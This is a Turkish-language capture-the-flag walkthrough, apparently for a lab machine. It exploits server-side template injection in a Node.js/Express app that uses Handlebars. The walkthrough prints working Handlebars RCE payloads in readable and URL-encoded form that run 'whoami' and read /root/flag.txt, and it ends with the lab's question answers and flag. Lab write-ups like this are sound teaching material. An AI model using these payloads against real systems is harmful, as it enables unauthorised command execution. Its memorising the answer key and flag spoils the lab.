## 1. Keşif

Standart prosedürüm gereği ilk adım her zaman kapsamlı bir Nmap taraması. Tüm portları tarayıp servis/versiyon ve OS tespiti alıyorum:

```bash
nmap -sS -A -p- -T5 10.129.184.197
```

<img width="671" height="428" alt="nmap" src="https://github.com/user-attachments/assets/2a74ef8c-51ef-4508-975b-775f3cf799a6" />


Sonuç olarak hedefte **2 adet TCP portu** açık: **22 (SSH)** ve **80 (HTTP)**. Nmap'in servis tespiti HTTP portunda ilginç bir detay veriyor: `Node.js (Express middleware)` — yani karşımızda bir Express.js backend'i var.

---

## 2. Web Uygulamasının İncelenmesi

<img width="723" height="520" alt="site" src="https://github.com/user-attachments/assets/37c48769-e236-4892-94ac-0f2645bade68" />

Tarayıcıdan `http://10.129.184.197` adresine gidiyorum.

Ayrıca tarayıcı eklentim (Wappalyzer) ile teknoloji yığınına bakıyorum. Backend tarafında **Express** framework'ünün kullanıldığını doğruluyorum. Bu, Nmap'in zaten verdiği "Express middleware" bilgisiyle tutarlı.

Kullanıcıdan veri alan bir input alanı ve backend'in Node.js/Express olması, benim aklıma direkt **Server-Side Template Injection (SSTI)** ihtimalini getiriyor. Node.js ekosisteminde en yaygın template motorları arasında Handlebars, EJS, Pug gibi seçenekler var; bunların input sanitizasyonu düzgün yapılmazsa SSTI'ye açık hâle gelebiliyorlar.

---

## 3. SSTI Zafiyetinin Tespiti

Klasik SSTI test payload'ı olan `{{7*7}}` ifadesini e-posta input alanına giriyorum ve isteği gönderiyorum.

**Payload:**
```
{{7*7}}
```

Sunucudan gelen cevap gayet konuşkan — tam bir stack trace ile karşılaşıyorum:

<img width="865" height="420" alt="hata1" src="https://github.com/user-attachments/assets/33597b39-1b25-4ec7-b48c-d8c956536350" />

Hata mesajı her şeyi ele veriyor: `handlebars/dist/cjs/handlebars/compiler/parser.js` — backend, template motoru olarak **Handlebars** kullanıyor ve girdiğim `{{7*7}}` doğrudan template parser'ına gidip parse hatasına sebep olmuş. Bu, klasik bir **SSTI (Server-Side Template Injection)** doğrulamasıdır: kullanıcı girdisi sanitize edilmeden template içine enjekte ediliyor.

Ayrıca hata mesajındaki dosya yolundan sunucudaki backend kodunun `/root/Backend/` dizininde çalıştığını da öğrenmiş oluyorum

---

## 4. RCE'ye Giden Yol — Handlebars SSTI İstismarı

Handlebars, tasarım gereği "logic-less" (mantıksız) bir template motoru olduğu için doğrudan `{{7*7}}` gibi ifadeleri desteklemiyor. Ancak Handlebars'ın bazı zayıf noktaları literatürde iyi bilinen bir konu. HackTricks üzerindeki Handlebars SSTI bölümünden, Handlebars'ın `constructor` zincirini kötüye kullanarak JavaScript native fonksiyonlarına (`Function` constructor'ı) erişim sağlayan ve nihayetinde `require`'a ulaşan bir bypass payload'ı buluyorum. Bu tür payload'lar genellikle özel karakterler (`{`, `}`, `#`, `|` vb.) içerdiği için ham hâlde göndermek sorun çıkarabiliyor; bu yüzden isteği **Burp Suite**'in **Decoder** sekmesinde **URL Encode** ederek göndermem gerekiyor.

### 4.1. İlk deneme

URL-encode edilmiş hâliyle gönderdiğim payload:

```
%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0D%0A%20%20%7B%7B%23with%20%22e%22%7D%7D%0D%0A%20%20%20%20%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epush%20%28lookup%20string%2Esub%20%22constructor%22%29%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%23with%20string%2Esplit%20as%20%7Ccodelist%7C%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epush%20%22return%20require%28%27child%5Fprocess%27%29%2Eexec%28%27whoami%27%29%3B%22%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%23each%20conslist%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20%28string%2Esub%2Eapply%200%20codelist%29%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%2Feach%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%7B%7B%2Fwith%7D%7D%0D%0A%7B%7B%2Fwith%7D%7D
```

Bu payload'ı decode ettiğimizde okunabilir hâli şu şekilde:

<img width="798" height="386" alt="içerikkod" src="https://github.com/user-attachments/assets/8a6e4b7a-9458-46b5-ad84-67352b704c3f" />


İsteği Burp Suite'te yakalayıp bu şekilde gönderiyorum. Ancak cevap olarak şu hatayı alıyorum:

<img width="1545" height="477" alt="istekhata" src="https://github.com/user-attachments/assets/a6f1962f-0042-4139-8a90-42bf0461a59e" />


Bu hata çok kritik bir ipucu veriyor: **`require`** fonksiyonu, standart Node.js modüllerinde her dosyada otomatik olarak tanımlı olsa da, Handlebars'ın çalıştırdığı `Function` constructor context'inde **tanımsız (undefined)** kalıyor. Çünkü `new Function()` ile oluşturulan kod, dosya bazlı module scope'undan bağımsız çalışır ve Node.js'in her modüle özel enjekte ettiği `require`, `module`, `__dirname` gibi değişkenlere sahip değildir.

### 4.2. Payload'ın düzeltilmesi

Bu sorunun bilinen çözümü, `require`'a doğrudan değil, global olarak her zaman erişilebilen **`process`** nesnesi üzerinden ulaşmak: `process.mainModule.require(...)`. `process`, Node.js'te gerçek anlamda global scope'a bağlı olan (top-level scope'a ait) bir nesne olduğu için `Function` constructor context'inden de erişilebiliyor.

Payload'ı güncelliyorum:

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('whoami').toString();"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

Bunu tekrar Burp'te URL-encode edip gönderiyorum. Bu sefer cevap tam istediğim gibi geliyor:

<img width="1532" height="501" alt="istek2" src="https://github.com/user-attachments/assets/eed3c896-c7b0-4c00-acb6-80aac1f62dd1" />

```
We will contact you at:       e
2
[object Object]
  function Function() { [native code] }
  2
  [object Object]
      root
```

En sondaki satırda **`root`** yazıyor — yani `whoami` komutunun çıktısı bu. Web sunucusu (Express uygulaması) **root kullanıcısı** olarak çalışıyormuş. Bu ciddi bir yanlış yapılandırma; normalde web servisleri düşük yetkili bir kullanıcıyla (örn. `www-data`, `node`) çalıştırılmalı.

---

## 5. Komut Çalıştırma ve Flag'in Ele Geçirilmesi

Artık `execSync` ile keyfi komut çalıştırabildiğime göre, root kullanıcısının ana dizinindeki flag dosyasını okumayı deniyorum. Payload'daki komutu değiştiriyorum:

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('cat /root/flag.txt').toString();"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

URL-encode edilmiş hâli:

```
%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0A%20%20%7B%7B%23with%20%22e%22%7D%7D%0A%20%20%20%20%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0A%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%7B%7Bthis.push%20(lookup%20string.sub%20%22constructor%22)%7D%7D%0A%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%7B%7B%23with%20string.split%20as%20%7Ccodelist%7C%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7Bthis.push%20%22return%20process.mainModule.require(%27child_process%27).execSync(%27cat%20%2Froot%2Fflag.txt%27).toString()%3B%22%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7B%23each%20conslist%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20(string.sub.apply%200%20codelist)%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7B%2Feach%7D%7D%0A%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0A%20%20%20%20%7B%7B%2Fwith%7D%7D%0A%20%20%7B%7B%2Fwith%7D%7D%0A%7B%7B%2Fwith%7D%7D
```

Bu isteği Burp Suite üzerinden gönderiyorum. Cevap olarak şunu alıyorum:

<img width="1528" height="496" alt="flag" src="https://github.com/user-attachments/assets/5311dbf1-8f39-4a5f-8870-3d3869f32483" />


```html
<p class="result">
    We will contact you at:       e
  2
  [object Object]
    function Function() { [native code] }
    2
    [object Object]
        6b258d726d287462d60c103d0142a81c
</p>
```

Response içinde flag'i başarıyla görüyorum. 🎉

---


## 7. Görev Soruları ve Cevapları

**Görev 1 — Nmap hangi TCP portlarını açık olarak tanımlıyor? Portları virgülle ayırarak ve aralarında boşluk bırakmadan, düşükten yükseğe doğru bir liste halinde yanıtlayın.**
`22,80`

**Görev 2 — Birinci soruda belirtilen http/web portunda dinleme yapan hizmeti hangi yazılım çalıştırıyor?**
`Node.js`

**Görev 3 — Wappalyzer'a göre Web Framework'ün adı nedir?**
`Express`

**Görev 4 — Gönderdiğimiz komutla test ettiğimiz güvenlik açığının adı nedir `{{7*7}}`?**
`Server-Side Template Injection`

**Görev 5 — Node.JS'de kullanılan şablonlama motoru nedir?**
`Handlebars`

**Görev 6 — BurpSuite'te metni kodlamak için kullanılan sekmenin adı nedir?**
`Decoder`

**Görev 7 — HTTP isteğinde veri paketimize özel karakterler eklemek için veri paketini kodlayacağız. Peki hangi kodlama türünü kullanacağız?**
`URL`

**Görev 8 — HackTricks'ten gelen bir yükü kullanarak sistem komutlarını çalıştırmaya çalıştığımızda bir hata alıyoruz. Yanıt hatasında "tanımlanmamış" olan nedir?**
`require`

**Görev 9 — Node.JS'de en üst düzey kapsamın (top-level scope) adı hangi değişkene verilir?**
`global`

**Görev 10 — Bu güvenlik açığından yararlanarak, web sunucusunun çalıştığı kullanıcı olarak komut yürütme olanağı elde ediyoruz. Bu kullanıcının adı nedir?**
`root`

**Tek Bayrak Gönder — Kök kullanıcının ana dizininde bulunan bayrağı gönderin.**
`6b258d726d287462d60c103d0142a81c`
